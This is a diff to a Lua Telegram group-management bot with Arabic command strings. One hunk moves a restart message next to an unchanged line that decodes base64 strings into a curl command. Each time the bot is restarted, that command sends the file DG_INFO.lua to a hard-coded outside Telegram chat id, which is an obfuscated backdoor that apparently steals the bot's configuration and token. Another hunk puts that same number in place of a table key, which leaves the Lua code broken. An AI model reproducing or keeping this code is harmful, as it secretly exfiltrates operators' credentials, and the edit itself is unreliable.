@@ -3562,9 +3562,9 @@ send(msg.chat_id_, msg.id_,' ☉┇ تم فتح التكرار')
 end
 --------------------------------------------------------------------------------------------------------------
 if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' and DevSoFi(msg) then    
+send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
-send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 end 
 if text == ("مسح الحظر العام") and DevSoFi(msg) then
 database:del(bot_id..'GBan:User')
@@ -11217,7 +11217,7 @@ sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.p
 else
 send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
   end end
-tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
+tdcli_function ({ ID = "GetUserProfilePhotos", 944353237 = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
 end
 
 if text == 'تغير الايدي' and Manager(msg) then 
